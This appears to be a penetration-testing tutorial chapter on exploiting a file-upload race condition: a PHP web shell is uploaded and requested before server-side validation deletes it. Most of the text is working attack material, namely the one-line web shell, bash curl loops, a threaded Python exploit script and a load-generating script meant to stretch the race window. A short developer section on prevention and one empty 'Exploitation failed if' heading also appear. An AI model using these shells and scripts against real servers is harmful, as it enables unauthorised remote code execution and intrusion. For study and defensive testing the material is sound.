# 2.2 Race Condition Upload

## Goal

Execute uploaded file before server validation processes and removes it, exploiting the timing window between upload and validation.

---

## Why This Works

Upload process typically has multiple steps:

```
1. File received by server
2. File temporarily stored
3. Validation checks run
4. File approved/rejected
5. File moved to final location

VULNERABILITY:
Between Step 2 and Step 4, file is accessible but not yet validated!

Attack:
├─ Upload malicious file (Step 1-2)
├─ Immediately request file while accessible (Step 2.5)
├─ Execute before validation removes it (Step 3)
└─ RCE achieved ✓
```

---

## How To Exploit

### Step 1: Identify Upload Endpoint

```
Find file upload form:
POST /upload.php
POST /api/upload
POST /admin/upload
```

### Step 2: Create Malicious File

```php
<?php system($_GET['c']); ?>
```

### Step 3: Prepare Two Requests

**Request A (Upload):**
```
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data

[PHP malicious file]
```

**Request B (Access):**
```
GET /uploads/shell.php?c=id
```

### Step 4: Send Requests Rapidly

Time it so that:
- Request A uploads file
- Before validation removes it
- Request B accesses and executes it
- Within milliseconds

### Step 5: Use Threading/Automation

```bash
# Bash script for rapid requests
for i in {1..100}; do
  curl -F "file=@shell.php" http://target/upload.php &
  curl http://target/uploads/shell.php?c=id &
  wait
done
```

## Tools for Race Condition

### Burp Suite Intruder

1. Capture upload request
2. Set up second request to access file
3. Group both requests
4. Use "Resource Pool" for parallel execution
5. Adjust timing to match race window

### Python Script

```python
import threading
import requests
import time

target = "http://target.com"
upload_url = f"{target}/upload.php"
access_url = f"{target}/uploads/shell.php"

def upload():
    files = {'file': open('shell.php', 'rb')}
    requests.post(upload_url, files=files)

def access():
    time.sleep(0.1)  # Small delay to ensure upload
    for i in range(100):
        r = requests.get(access_url + f"?c=id&t={i}")
        if "uid=" in r.text:
            print(f"SUCCESS! Output: {r.text}")
            return True
    return False

# Start both in parallel
t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=access)
t1.start()
t2.start()
t1.join()
t2.join()
```

## Timing Considerations

### Race Window Depends On

```
├─ Server processing speed
├─ Validation complexity
├─ File system speed
├─ Network latency
└─ Server load

Typical race window: 100ms - 5 seconds
```

### Optimal Timing

```
Very fast: 10-50ms (high precision needed)
Normal: 50-500ms (most common)
Slow: 500ms-2 seconds (slow validation)
Very slow: 2+ seconds (complex checks)
```

## Real-World Example

### Vulnerable Code

```php
// Upload handler
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);

// Later - validation
$file = 'uploads/' . $_GET['file'];
if (!isValidImage($file)) {
    unlink($file);  // Delete if not valid
    die("Invalid file");
}
```

**Vulnerability:** File accessible between upload and validation

### Exploitation

```
1. Upload shell.php
2. GET /uploads/shell.php?c=id (during validation window)
3. Code executes before deletion
4. RCE achieved
```

## Detection Indicators

**Race condition vulnerable if:**
- ✅ File briefly appears in accessible location
- ✅ Can execute file before validation completes
- ✅ File disappears after few seconds
- ✅ Multiple requests can succeed during window

**Not vulnerable if:**
- ❌ File stored outside web root
- ❌ Validation happens before accessibility
- ❌ File renamed immediately
- ❌ Atomic operations prevent race

---

## Prevention (For Developers)

❌ **Bad:** Validate after upload

```php
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/temp.php');
if (!isValidImage('uploads/temp.php')) {
    unlink('uploads/temp.php');
}
```

✅ **Good:** Validate before moving to web-accessible location

```php
// Store in temporary, protected location
$temp_file = sys_get_temp_dir() . '/' . uniqid();
move_uploaded_file($_FILES['file']['tmp_name'], $temp_file);

// Validate
if (!isValidImage($temp_file)) {
    unlink($temp_file);
    die("Invalid");
}

// Only then move to web-accessible
move_uploaded_file($temp_file, 'uploads/safe_image.jpg');
```

✅ **Better:** Rename file first, prevent execution

```php
// Generate safe filename
$new_name = uniqid() . '.jpg';
$safe_path = 'uploads/' . $new_name;

// Move uploaded file
move_uploaded_file($_FILES['file']['tmp_name'], $safe_path);

// Validate
if (!isValidImage($safe_path)) {
    unlink($safe_path);
    die("Invalid");
}

// File is now safe - renamed to .jpg, will be served as image
// Even if accessed, served as image, not executed
```

## Advanced Techniques

### Technique 1: Concurrent Uploads

```bash
# Upload multiple times simultaneously
for i in {1..50}; do
  (curl -F "file=@shell.php" http://target/upload.php &)
done
wait

# One might succeed before validation
```

### Technique 2: Connection Pool Exhaustion

Exhaust server connections so validation is delayed:

```python
import requests
import threading

# Slow-read exploit
for i in range(100):
    threading.Thread(target=lambda: 
        requests.get("http://target/slow_endpoint", 
                    stream=True, timeout=30)
    ).start()

# Now upload - server under load, validation slower
requests.post("http://target/upload.php", files={'file': open('shell.php')})
```

### Technique 3: Repeated Fast Requests

```bash
# Burst of rapid requests
time_before=$(date +%s%N)
for i in {1..1000}; do
  curl http://target/uploads/shell.php?c=id &
done
wait
time_after=$(date +%s%N)
```

## Testing Methodology

### Step 1: Baseline Test

```
1. Upload normal file (image)
2. Monitor how long it's accessible
3. When does validation happen?
4. When is file deleted?
```

### Step 2: Identify Window

```
Time file accessible: T1
Time validation starts: T2
Time file deleted: T3

Race window = T2 - T1 to T3 - T1
```

### Step 3: Prepare Exploit

```
Upload malicious file
Access file within identified window
Time requests accordingly
```

### Step 4: Execute

```
Rapid upload + access requests
Within millisecond precision if needed
Monitor for success indicators
```

- ✅ File executes with payload
- ✅ RCE confirmed

**Exploitation failed if:**

## Challenges & Limitations

### Why Race Conditions Are Hard

```
❌ Timing is critical (milliseconds matter)
❌ Unreliable (depends on server load)
❌ Rate-limited (upload limits)
❌ Network latency (affects timing)
❌ Server randomness (cache, load balancing)
```

### When They Work Best

```
✅ Slow servers (more time in window)
✅ Heavy validation (slower checks)
✅ File system I/O (disk access delay)
✅ Low upload limits (fewer restrictions)
```
